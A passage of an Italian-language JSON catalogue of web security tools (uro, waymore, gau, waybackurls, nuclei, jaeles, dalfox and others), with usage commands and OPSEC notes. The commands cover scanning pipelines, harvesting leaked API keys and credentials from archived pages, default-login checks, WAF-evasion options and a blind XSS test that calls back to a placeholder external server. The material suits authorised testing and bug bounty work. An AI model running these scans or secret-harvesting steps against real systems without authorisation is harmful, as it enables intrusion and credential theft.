php,asp,aspx,jsp,json,xml > dynamic_urls.txt\n\n# Blacklist asset statici (immagini, font, etc.)\ncat urls.txt | uro -b png,jpg,gif,svg,woff,woff2,ttf,css\n\n# Workflow Bug Bounty completo\nwaybackurls target.com > raw_urls.txt\ngau target.com >> raw_urls.txt\ncat raw_urls.txt | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | sort -u > fuzz_ready.txt\n\n# Preserva contenuti blog (utile per scraping)\ncat urls.txt | uro --filter keepcontent\n\n# Rimuovi URL incrementali (/page/1, /page/2, /id/123)\ncat urls.txt | uro  # default behavior</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>URL Preprocessing:</strong> Essenziale per preparare liste URL da gau, waybackurls o waymore prima di passarle a scanner come nuclei o dalfox.</li><li><strong>Noise Reduction:</strong> Riduce drasticamente il noise (spesso 90%+) e il tempo di scansione eliminando duplicati e asset statici.</li><li><strong>Vulnerability Filtering:</strong> Identifica URL con parametri potenzialmente vulnerabili (id, file, path, url, redirect) per testing mirato.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> Nessuno. Tool completamente offline che non genera traffico.</li><li><strong>Privacy:</strong> Opera solo su dati locali, nessuna comunicazione di rete.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "Utilities"
    ],
    "notes": null
  },
  {
    "id": "waymore",
    "name": "waymore",
    "version": "7.4",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/xnl-h4ck3r/waymore",
    "desc": "Recupera URL storici da Wayback Machine, Common Crawl, AlienVault OTX, URLScan, VirusTotal e IntelligenceX.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Waymore</strong> è uno strumento di ricognizione avanzato che supera waybackurls e gau aggregando URL archiviati da molteplici fonti storiche. Integra Wayback Machine, Common Crawl (250+ miliardi di pagine indicizzate), AlienVault OTX, URLScan.io, VirusTotal e IntelligenceX per massimizzare la copertura. La caratteristica distintiva è la capacità di scaricare le risposte archiviate complete (HTML, JS, JSON), non solo gli URL, permettendo analisi offline del contenuto storico per trovare secrets, API keys e credenziali rimosse.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Aggregation:</strong> Interroga 6+ archivi in parallelo. Ogni fonte ha coverage diversa: Common Crawl eccelle per siti commerciali, Wayback per longevità storica, URLScan per siti recenti e malware analysis.</p><p><strong>Response Archive Download:</strong> Scarica il contenuto archiviato completo delle pagine. Fondamentale per trovare API keys, credenziali AWS/GCP hardcoded, token JWT, o endpoint in versioni precedenti del codice sorgente.</p><p><strong>Smart Filtering:</strong> Filtra per HTTP status code (es. solo 200), MIME type (application/json per API), keyword nel body, e date range. Riduce drasticamente il noise da migliaia a centinaia di URL rilevanti.</p><p><strong>Resume &amp; Rate Limit:</strong> Riprende download interrotti automaticamente. Gestisce i rate limit di ogni fonte (Wayback: 15 req/min, VirusTotal: API-dependent) senza intervento manuale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># URL discovery completa (tutte le fonti abilitate)\nwaymore -i target.com -mode U -oU urls.txt\n\n# Scarica le RISPOSTE archiviate (gold mine per secrets!)\nwaymore -i target.com -mode R -oR ./responses/\n# Cerca secrets nelle risposte scaricate:\ngrep -rE \"api[_-]?key|password|secret|AKIA[0-9A-Z]{16}\" ./responses/\ntrufflehog filesystem ./responses/  # detection avanzata\n\n# Filtro temporale (cerca vecchie versioni pre-patch)\nwaymore -i target.com -mode U -from 2018 -to 2020 -oU old_endpoints.txt\n\n# Solo risposte JSON (scopri API endpoints storici)\nwaymore -i target.com -mode R -f \"application/json\" -oR ./api_responses/\njq -r 'keys[]' ./api_responses/*.json | sort -u  # estrai campi\n\n# Batch processing per programmi bug bounty\ncat scope_domains.txt | while read domain; do\n  waymore -i \"$domain\" -mode U -oU \"results/${domain}_urls.txt\"\ndone\ncat results/*_urls.txt | uro | anew all_scope_urls.txt\n\n# Cerca backup, config, admin panels storici\nwaymore -i target.com -mode U | \\\n  grep -iE \"backup|config|admin|debug|swagger|graphql\" | anew interesting.txt\n\n# Pipeline completa Bug Bounty\nwaymore -i target.com -mode U | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | httpx -silent | nuclei -t cves/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Secret Discovery:</strong> Le risposte archiviate spesso contengono API keys, credenziali AWS (AKIA...), token JWT, webhook URLs che sono stati successivamente rimossi dal codice live</li><li><strong>Legacy Endpoint Hunting:</strong> Trova endpoint deprecati ma ancora funzionanti (/api/v1/ quando il sito usa /api/v3/), admin panels dimenticati, debug endpoints</li><li><strong>Vulnerability Timeline:</strong> Confronta versioni storiche per identificare quando una vulnerabilità è stata introdotta o patchata (utile per responsible disclosure)</li><li><strong>OSINT Investigation:</strong> Ricostruisci la storia completa di un sito, identifica tecnologie precedenti, trova informazioni rimosse (contatti, partner, prezzi)</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Completamente Passivo:</strong> Zero traffico verso il target. Tutte le query sono verso archivi pubblici (Wayback, Common Crawl, etc.)</li><li><strong>API Keys Opzionali:</strong> VirusTotal e IntelligenceX richiedono API key per accesso completo. Configura in ~/.config/waymore/config.yml</li><li><strong>Storage Planning:</strong> Il mode R può scaricare GB di dati per target grandi. Usa -lr (limit responses) per controllare</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "URL_Archive"
    ],
    "notes": null
  },
  {
    "id": "anew",
    "name": "anew",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/tomnomnom/anew",
    "desc": "Utility che appende linee a un file solo se non già presenti, con output simultaneo su stdout.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Anew</strong> è un'utility Go di tomnomnom che risolve un problema comune nei workflow di security testing: mantenere liste cumulative senza duplicati. Funziona come <code>tee -a</code> ma con deduplicazione integrata - appende linee da stdin a un file solo se non esistono già, scrivendo simultaneamente le nuove linee su stdout per permettere ulteriore piping. Questo pattern è fondamentale per costruire dataset incrementali in sessioni di recon multiple.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Smart Deduplication:</strong> Confronta ogni linea in input con il contenuto esistente del file. Solo le linee nuove vengono appese, evitando duplicati anche su file di milioni di righe.</p><p><strong>Dual Output Stream:</strong> Le linee nuove vanno sia al file che a stdout. Questo permette pipeline come: <code>tool | anew file.txt | next_tool</code> dove next_tool processa solo i nuovi risultati.</p><p><strong>Dry-Run Mode:</strong> Flag <code>-d</code> mostra cosa verrebbe aggiunto senza modificare il file. Utile per preview prima di operazioni su file critici.</p><p><strong>Quiet Mode:</strong> Flag <code>-q</code> sopprime l'output stdout, utile quando vuoi solo aggiornare il file senza output a terminale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Workflow base: accumula subdomain da run multipli\nsubfinder -d target.com | anew subdomains.txt\namass enum -d target.com | anew subdomains.txt\nassetfinder target.com | anew subdomains.txt\n# subdomains.txt ora contiene l'unione senza duplicati\n\n# Pipeline: processa SOLO i nuovi subdomain trovati\nsubfinder -d target.com | anew subdomains.txt | httpx -silent | nuclei\n# httpx e nuclei vedono solo subdomain nuovi, non già processati\n\n# Continuous recon con notifica nuove scoperte\nwhile true; do\n  subfinder -d target.com -silent | anew subdomains.txt | \\\n    notify -silent -provider slack  # notifica solo nuovi\n  sleep 3600  # ogni ora\ndone\n\n# Dry-run per vedere differenze tra due scansioni\nsubfinder -d target.com | anew -d old_subdomains.txt\n# Mostra solo i subdomain nuovi rispetto alla scansione precedente\n\n# Merge file senza duplicati\ncat file1.txt file2.txt file3.txt | anew -q merged.txt\n\n# Accumula URL da tool multipli in parallelo\ngau target.com | anew urls.txt &amp;\nwaybackurls target.com | anew urls.txt &amp;\nwait\ncat urls.txt | uro > clean_urls.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Continuous Recon:</strong> Esegui scansioni periodiche accumulando risultati. Processa solo le nuove scoperte evitando lavoro duplicato</li><li><strong>Multi-Tool Aggregation:</strong> Combina output di subfinder, amass, assetfinder in un unico file deduplicato</li><li><strong>Delta Processing:</strong> In pipeline, passa ai tool successivi solo i risultati nuovi (es. scansiona con nuclei solo subdomain appena scoperti)</li><li><strong>Bug Bounty Monitoring:</strong> Integra con notify per alert su nuovi asset in scope</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Nessun Traffico:</strong> Tool puramente locale, opera solo su file e stdin/stdout</li><li><strong>Performance:</strong> Efficiente anche su file grandi grazie a map lookup O(1) in memoria</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "Utilities"
    ],
    "notes": null
  },
  {
    "id": "gau",
    "name": "gau",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/lc/gau",
    "desc": "Recupera URL noti da AlienVault OTX, Wayback Machine, Common Crawl e URLScan per un dominio.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GAU</strong> (GetAllUrls) è un'utility Go veloce e leggera che aggrega URL da 4 fonti storiche principali: Wayback Machine (archive.org), Common Crawl, AlienVault's Open Threat Exchange (OTX), e URLScan.io. A differenza di waybackurls (solo Wayback), gau combina multiple fonti per massimizzare la scoperta di endpoint storici, path legacy, e risorse non più linkate ma potenzialmente ancora accessibili. È uno dei tool più usati nella fase iniziale di bug bounty recon.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Parallel:</strong> Interroga tutte e 4 le fonti simultaneamente. Ogni fonte ha punti di forza diversi: OTX per threat intel, URLScan per siti recenti, Common Crawl per coverage commerciale.</p><p><strong>Smart Filtering:</strong> Blacklist per escludere estensioni inutili (png, jpg, css, woff), whitelist per includere solo estensioni interessanti, filtri per MIME type e status code HTTP.</p><p><strong>Fetch Parameters:</strong> Flag <code>--fp</code> rimuove URL con stesso path ma parametri diversi, riducendo drasticamente i duplicati mantenendo la varietà di endpoint.</p><p><strong>Date Range:</strong> Filtra per periodo temporale (<code>--from</code>, <code>--to</code>) per trovare URL di versioni specifiche del sito.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># URL discovery base per singolo dominio\ngau target.com --o urls.txt\n\n# Escludi asset statici (riduce noise ~80%)\ngau target.com --blacklist png,jpg,gif,svg,css,woff,woff2,ttf,ico\n\n# Solo estensioni interessanti per web testing\ngau target.com --whitelist php,asp,aspx,jsp,json,xml,js\n\n# Rimuovi URL con stesso path (deduplica parametri)\ngau target.com --fp | uro > unique_paths.txt\n\n# Batch processing da lista subdomain\ncat subdomains.txt | gau --threads 5 --o all_urls.txt\n\n# Filtra per periodo (cerca versioni vulnerabili)\ngau target.com --from 2019 --to 2021 | grep -E \"api|admin\"\n\n# Output JSON per parsing programmatico\ngau target.com --json | jq -r '.url'\n\n# Pipeline completa: gau -> uro -> parametri -> nuclei\ngau target.com | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | sort -u | nuclei -t fuzzing-templates/\n\n# Combina con waybackurls per coverage massima\n{ gau target.com; waybackurls target.com; } | sort -u | uro > combined.txt\n\n# Con provider specifici (config ~/.gau.toml)\ngau target.com --providers wayback,otx  # solo queste fonti</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Initial Recon:</strong> Primo passo in bug bounty - mappa tutti gli endpoint storici prima di scansioni attive</li><li><strong>Legacy Endpoint Discovery:</strong> Trova /api/v1/ quando il sito usa /api/v3/, admin panels con path non standard, debug endpoints dimenticati</li><li><strong>Parameter Mining:</strong> Estrai nomi di parametri usati storicamente per costruire wordlist custom di fuzzing</li><li><strong>JavaScript Analysis:</strong> Filtra per .js per trovare file JS storici che potrebbero contenere endpoint hardcoded o secrets</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Completamente Passivo:</strong> Zero traffico verso il target.</p><p>Query solo verso archivi pubblici</li><li><strong>Rate Limits:</strong> Le fonti hanno limiti (Wayback ~15 req/min).</p><p>Gau li gestisce automaticamente</li><li><strong>API Keys:</strong> URLScan e OTX funzionano meglio con API key in ~/.gau.toml</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "URL_Archive"
    ],
    "notes": null
  },
  {
    "id": "jaeles",
    "name": "jaeles",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/jaeles-project/jaeles",
    "desc": "Framework per web security scanning basato su signature YAML customizzabili per vulnerability detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Jaeles</strong> è un framework Go per costruire scanner di sicurezza web personalizzati basati su signature YAML. A differenza di nuclei che ha template pre-definiti, Jaeles eccelle nella creazione di detection logic custom grazie al suo linguaggio di signature espressivo. Supporta detection di XSS, SQLi, LFI, SSRF, misconfigurations e CVE specifiche. Descritto come \"Swiss Army knife for automated Web Application Testing\", gestisce fino a 100+ richieste concorrenti con retry automatico e rate limiting intelligente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Expressive Signatures:</strong> Linguaggio YAML potente con variabili, condizioni, regex matching, e response analysis. Permette detection logic complessa impossibile con altri scanner.</p><p><strong>Signature Levels:</strong> Tre livelli di aggressività (L1=safe, L2=medium, L3=aggressive). Permette di controllare il rischio di triggering WAF o causare problemi.</p><p><strong>Passive &amp; Active:</strong> Supporta sia analisi passiva di response già catturate che testing attivo con payload injection.</p><p><strong>Rich Reporting:</strong> Output in JSON, HTML con screenshot, Markdown. Integrazione con Burp Suite tramite plugin dedicato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Download signature ufficiali (primo utilizzo)\njaeles config init\n\n# Scan base con tutte le signature\njaeles scan -s ~/.jaeles/base-signatures/ -u https://target.com/\n\n# Solo signature CVE critiche\njaeles scan -s cves/ -u https://target.com -L 1 --no-background\n\n# Batch scan da lista URL con output HTML\ncat urls.txt | jaeles scan -s passives/ -o ./results --html\n\n# Scan parametri per injection (SQLi, XSS)\njaeles scan -s sqli,xss -U params_urls.txt -c 50 --verbose\n\n# Con header custom (auth required)\njaeles scan -s all -u https://target.com \\\n  -H \"Authorization: Bearer eyJ...\" \\\n  -H \"Cookie: session=abc123\"\n\n# Pipeline: gau -> filtra params -> jaeles\ngau target.com | uro --filter hasparams | \\\n  jaeles scan -s sqli,ssrf -c 30 -o findings/\n\n# Signature custom per la tua organizzazione\njaeles scan -s /path/to/custom-signatures/ -U targets.txt\n\n# Solo passive analysis (no active requests)\njaeles scan -s passives/ --passive -U urls.txt\n\n# Con proxy per debug/logging in Burp\njaeles scan -s all -u https://target.com --proxy http://127.0.0.1:8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Custom Vulnerability Detection:</strong> Crea signature specifiche per vulnerabilità della tua organizzazione o CVE non ancora coperte da altri scanner</li><li><strong>Regression Testing:</strong> Verifica che vulnerabilità fixate non riappaiano in nuove release</li><li><strong>CI/CD Security Gate:</strong> Integra in pipeline DevSecOps per bloccare deploy con vulnerabilità note</li><li><strong>Bug Bounty Automation:</strong> Scansiona automaticamente nuovi endpoint scoperti durante recon</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Traffico Attivo:</strong> Genera richieste HTTP con payload potenzialmente malevoli (SQLi, XSS payloads)</li><li><strong>WAF Detection:</strong> Signature aggressive (L3) possono triggare WAF.</p><p>Usa L1 per engagement stealth</li><li><strong>Rate Limiting:</strong> Configura <code>-c</code> (concurrency) e <code>--delay</code> per evitare ban</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "waybackurls",
    "name": "waybackurls",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/tomnomnom/waybackurls",
    "desc": "Recupera tutti gli URL archiviati dalla Wayback Machine per un dominio e i suoi subdomain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Waybackurls</strong> è un'utility Go di tomnomnom che interroga la Wayback Machine (archive.org) per recuperare tutti gli URL storici archiviati per un dominio. A differenza di gau che usa multiple fonti, waybackurls si concentra esclusivamente su Wayback Machine, risultando più veloce e leggero per query singole. Recupera automaticamente URL per tutti i subdomain archiviati del dominio target, rendendolo ideale come primo passo nella recon passiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Subdomain Coverage:</strong> Recupera URL non solo per target.com ma anche per tutti i subdomain storicamente archiviati (api.target.com, staging.target.com, etc.).</p><p><strong>High Performance:</strong> Implementazione Go compilata, significativamente più veloce degli script Python equivalenti. Gestisce domini con milioni di URL archiviati.</p><p><strong>Pipeline Native:</strong> Accetta domini da stdin e output su stdout, perfetto per integrazione in workflow bash complessi.</p><p><strong>No Dependencies:</strong> Single binary senza dipendenze esterne, facilmente deployabile su qualsiasi sistema.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># URL discovery per singolo dominio\nwaybackurls target.com > all_urls.txt\n\n# Batch processing da lista subdomain\ncat subdomains.txt | waybackurls > all_historical_urls.txt\n\n# Filtra per endpoint interessanti\nwaybackurls target.com | grep -E \"api|admin|backup|config|debug\" > interesting.txt\n\n# Pipeline: waybackurls -> deduplica -> filtra params -> test\nwaybackurls target.com | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | sort -u > fuzz_targets.txt\n\n# Cerca file JavaScript storici (secret hunting)\nwaybackurls target.com | grep \"\\.js$\" | sort -u > js_files.txt\nhttpx -silent -l js_files.txt -mc 200 | \\\n  xargs -I {} bash -c 'curl -s {} | js-beautify' | \\\n  grep -iE \"api_key|secret|password|token\"\n\n# Combina con gau per coverage massima\n{ waybackurls target.com; gau target.com; } | sort -u | uro > combined.txt\n\n# Trova backup files dimenticati\nwaybackurls target.com | grep -iE \"\\.(bak|backup|old|sql|zip|tar|gz)$\"\n\n# Con timestamps (per analisi temporale)\nwaybackurls -dates target.com | sort -t '/' -k1 > urls_with_dates.txt\n\n# Continuous monitoring\nwhile true; do\n  waybackurls target.com | anew urls.txt | notify -provider slack\n  sleep 86400  # daily check\ndone</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Initial Passive Recon:</strong> Primo tool da lanciare - zero traffico verso target, scopre attack surface storica</li><li><strong>Legacy Endpoint Discovery:</strong> Trova versioni API deprecate (/api/v1/), admin panels con path non standard, staging environments</li><li><strong>Secret Hunting:</strong> File JS storici spesso contengono API keys, endpoint interni, credenziali hardcoded poi rimosse</li><li><strong>Backup File Discovery:</strong> Trova .bak, .sql, .zip archiviati e potenzialmente ancora accessibili sul server live</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>100% Passivo:</strong> Nessun traffico verso il target. Tutte le query vanno a web.archive.org</li><li><strong>Rate Limit:</strong> Wayback ha limiti (~15 req/min).</p><p>Per domini grandi, considera waymore che gestisce meglio i limiti</li><li><strong>Coverage:</strong> Solo Wayback Machine. Per coverage completa, combina con gau o waymore</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "URL_Archive"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-nuclei",
    "name": "nuclei",
    "version": "latest",
    "icon": "../app/icons/nuclei-logo.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/nuclei",
    "desc": "Scanner di vulnerabilità basato su template YAML con supporto multi-protocollo e community-driven.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nuclei</strong> è lo scanner di vulnerabilità open-source più potente e versatile disponibile, costruito su un ecosistema di template YAML contribuiti da migliaia di security professional in tutto il mondo. A differenza degli scanner tradizionali che si basano su signature proprietarie, Nuclei permette a chiunque di creare, condividere e personalizzare detection logic per qualsiasi tipo di vulnerabilità, misconfiguration o esposizione. Supporta scansioni via TCP, DNS, HTTP, SSL, WHOIS, JavaScript, Headless browser, Code execution e Websocket, rendendolo applicabile a praticamente qualsiasi scenario di security testing.</p><p>L'architettura è ottimizzata per velocità: il request clustering riduce drasticamente il numero di connessioni, la gestione intelligente del rate limiting previene blocchi, e il parallelismo configurabile permette di scansionare migliaia di host in minuti. La community maintiene oltre 8000 template pubblici che coprono CVE recenti, misconfiguration comuni, exposed panels, default credentials e vulnerability class specifiche.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Template-Based Architecture:</strong> Ogni controllo è definito in un file YAML human-readable. Questo permette audit del comportamento, customizzazione immediata e contribuzione community. I template supportano matchers regex, status code, word matching e DSL expressions per logica complessa.</p><p><strong>Multi-Protocol Support:</strong> HTTP/HTTPS con supporto full request customization, DNS per record enumeration e zone transfer detection, TCP/UDP raw per servizi custom, SSL/TLS per certificate analysis e cipher suite testing, File per local vulnerability scanning, Code per execution-based detection, Headless per JavaScript-rendered content e authentication flows.</p><p><strong>Workflow &amp; Automation:</strong> I workflow permettono di concatenare template in sequenze logiche (es. prima identifica CMS, poi lancia template specifici). Le variabili condivise permettono di passare dati tra step (es. token CSRF estratto usato in request successive).</p><p><strong>Enterprise Features:</strong> Integrazione nativa con Jira, Splunk, GitHub Issues, Elastic, GitLab, Slack, Discord, Telegram. Supporto per scan scheduling, reporting avanzato e team collaboration tramite ProjectDiscovery Cloud.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANSIONI BASE ===\n# Scan singolo target con tutti i template (non raccomandato su target prod)\nnuclei -u https://target.com\n\n# Scan con severity filter - solo critical e high (raccomandato per primo assessment)\nnuclei -u https://target.com -severity critical,high\n\n# === SCANSIONI MIRATE ===\n# Solo CVE degli ultimi 2 anni con rate limiting (evita WAF blocks)\nnuclei -u https://target.com -t cves/ -rl 50 -c 5 \\\n  -tags cve2024,cve2025 -o cve_results.txt\n\n# Template specifici per CMS detection + exploitation\nnuclei -u https://target.com -t technologies/ -t cves/wordpress/ \\\n  -t cves/joomla/ -t cves/drupal/ -json -o cms_vulns.json\n\n# === SCANSIONI MASSIVE ===\n# Batch scan da output di subfinder/httpx\nsubfinder -d target.com -silent | httpx -silent | \\\n  nuclei -t exposures/ -t misconfiguration/ -t cves/ \\\n  -severity medium,high,critical -c 50 -rl 100 -o findings.txt\n\n# Scan con resume (riprende se interrotto)\nnuclei -l 10k_urls.txt -t cves/ -resume\n\n# === TEMPLATE PERSONALIZZATI ===\n# Esegui template custom + community\nnuclei -u https://target.com -t ~/my-templates/ -t cves/ -validate\n\n# Cerca template per keyword\nnuclei -tl | grep -i \"wordpress\"\n\n# === OUTPUT &amp; REPORTING ===\n# Output multipli formati per reporting\nnuclei -l urls.txt -t cves/ -severity critical,high \\\n  -json -o detailed.json \\\n  -me markdown_export/ \\\n  -sarif sarif_report.sarif\n\n# === INTEGRAZIONE CI/CD ===\n# GitHub Actions compatible - exit 1 se critical found\nnuclei -l urls.txt -t cves/ -severity critical -silent -nc || exit 1\n\n# === SCANSIONI SPECIFICHE ===\n# Exposed panels e takeover\nnuclei -l subdomains.txt -t takeovers/ -t exposed-panels/ -c 100\n\n# Default credentials check\nnuclei -l urls.txt -t default-logins/ -rl 5 -c 2\n\n# SSL/TLS misconfiguration\nnuclei -l hosts.txt -t ssl/ -t misconfiguration/tls/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Vulnerability Assessment continuo:</strong> Integrato in pipeline CI/CD per scansione automatica ad ogni deploy, catch vulnerabilità prima che raggiungano produzione.</li><li><strong>Bug Bounty hunting:</strong> Template community coprono le vulnerability class più remunerative (SSRF, RCE, Auth bypass). La velocità permette di testare scope enormi rapidamente.</li><li><strong>Compliance e Audit:</strong> Template per verifica configurazioni SSL/TLS, security header, exposed services. Report esportabili per documentazione audit.</li><li><strong>Threat Detection:</strong> Template per webshell detection, malware indicators, compromission signs su infrastruttura già violata.</li><li><strong>Red Team reconnaissance:</strong> Identificazione rapida di entry point prima di exploitation manuale.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Fingerprinting:</strong> User-Agent default \"Nuclei\" è facilmente riconoscibile. Usa <code>-H \"User-Agent: Mozilla/5.0...\"</code> per blending.</li><li><strong>Payload detection:</strong> Molti template inviano payload attivi (SQLi, XSS, RCE attempts). WAF/IDS triggereranno alert.</li><li><strong>Rate limiting:</strong> Senza <code>-rl</code> e <code>-c</code> appropriati, il volume di richieste può causare blocchi o DoS involontari.</li><li><strong>Log forensics:</strong> Ogni richiesta Nuclei è loggata server-side. Template custom con identificatori unici sono tracciabili.</li></ul><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "dalfox",
    "name": "dalfox",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/hahwul/dalfox",
    "desc": "Scanner XSS automatizzato con detection reflected, stored e DOM-based tramite analisi statica e headless browser.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DalFox</strong> (DAta Leak and Finding Open Redirect/XSS) è lo scanner XSS più avanzato disponibile, costruito in Go da hahwul per automatizzare la detection di vulnerabilità Cross-Site Scripting in applicazioni web moderne. A differenza di scanner generici, DalFox è specializzato esclusivamente su XSS, implementando tecniche sofisticate che combinano analisi statica del codice sorgente, dynamic analysis tramite parameter fuzzing, e verifica comportamentale con headless browser per confermare l'effettiva esecuzione JavaScript.</p><p>Il tool eccelle nel gestire scenari complessi: WAF bypass tramite encoding chain e payload mutation, context-aware injection che adatta i payload al contesto HTML/JavaScript/Attribute in cui vengono riflessi, e DOM-based XSS detection che altri tool spesso mancano. La modalità Blind XSS supporta callback a server esterni per catturare esecuzioni delayed. Con oltre 1500 payload built-in e supporto per custom payloads, DalFox rappresenta lo state-of-the-art nel XSS hunting automatizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Mode Architecture:</strong> URL mode per test singoli, File mode per batch scanning, Pipe mode per integrazione in pipeline Unix, SXSS mode per Stored XSS con form submission automatica, Server mode che espone REST API per integrazione con altri tool, Payload mode per generazione di payload contestuali.</p><p><strong>Intelligent Parameter Analysis:</strong> Mining automatico di parametri da HTML source, JavaScript files e form elements. Identifica reflection points prima del fuzzing, ottimizzando le richieste e riducendo il rumore.</p><p><strong>Context-Aware Fuzzing:</strong> Analizza dove il payload viene riflesso (tag HTML, attributo, JavaScript context, URL parameter) e seleziona automaticamente i payload più efficaci per quel contesto specifico. Supporta breaking out da attributi, tag, commenti HTML e stringhe JS.</p><p><strong>WAF Bypass Engine:</strong> Implementa encoding chain (HTML entities, URL encoding, Unicode normalization, case variation), payload mutation e tecniche di evasione per bypassare WAF comuni come Cloudflare, Akamai, ModSecurity.</p><p><strong>Verification System:</strong> Headless browser integration (Chrome/Chromium) per verificare che i payload trovati effettivamente triggherino l'esecuzione JavaScript, eliminando falsi positivi da reflection senza execution.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANNING BASE ===\n# Scan URL singolo con tutti i controlli\ndalfox url \"https://target.com/search?q=test\" -o results.txt\n\n# Scan con parametri multipli\ndalfox url \"https://target.com/page?id=1&amp;name=test&amp;action=view\"\n\n# === SCANSIONI MASSIVE ===\n# Pipeline da gau/waybackurls - workflow tipico bug bounty\ngau target.com | grep \"=\" | uro | dalfox pipe -o xss_findings.txt\n\n# Batch scan con concurrency e timeout configurati\ndalfox file urls_with_params.txt -w 50 --timeout 10 -o batch_results.txt\n\n# === MODALITA' AVANZATE ===\n# Stored XSS - testa form submission\ndalfox sxss \"https://target.com/comment\" -d \"comment=FUZZ\" \\\n  --trigger \"https://target.com/view-comments\"\n\n# Blind XSS con callback server\ndalfox url \"https://target.com/feedback?msg=test\" \\\n  --blind \"https://your-server.com/callback\"\n\n# === WAF BYPASS ===\n# Encoding chain per WAF evasion\ndalfox url \"https://target.com/search?q=test\" \\\n  --waf-evasion --encoder url,html,unicode\n\n# Custom payload con WAF bypass\ndalfox url \"https://target.com/\" --custom-payload waf_bypass.txt \\\n  --skip-bav  # skip basic attack vectors, usa solo custom\n\n# === CONFIGURAZIONI AVANZATE ===\n# Con headers custom (auth, cookie)\ndalfox url \"https://target.com/api?q=test\" \\\n  -H \"Cookie: session=abc123\" \\\n  -H \"Authorization: Bearer token\" \\\n  --proxy http://127.0.0.1:8080  # route attraverso Burp\n\n# Mining parametri da pagina e test automatico\ndalfox url \"https://target.com/page\" --mining-all --deep-domxss\n\n# === OUTPUT &amp; REPORTING ===\n# Output JSON per parsing programmatico\ndalfox file urls.txt --format json -o report.json\n\n# Solo URL vulnerabili (per pipeline)\ndalfox pipe &lt; urls.txt --silence --only-poc\n\n# === SERVER MODE ===\n# Avvia API server per integrazione\ndalfox server --host 0.0.0.0 --port 6664\n# Poi: curl -X POST http://localhost:6664/scan -d '{\"url\":\"...\"}'\n\n# === DOM XSS SPECIFICO ===\n# Deep DOM analysis con headless\ndalfox url \"https://spa-target.com/#/page?param=test\" \\\n  --deep-domxss --headless</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Bug Bounty hunting:</strong> XSS rimane una delle vulnerabilità più 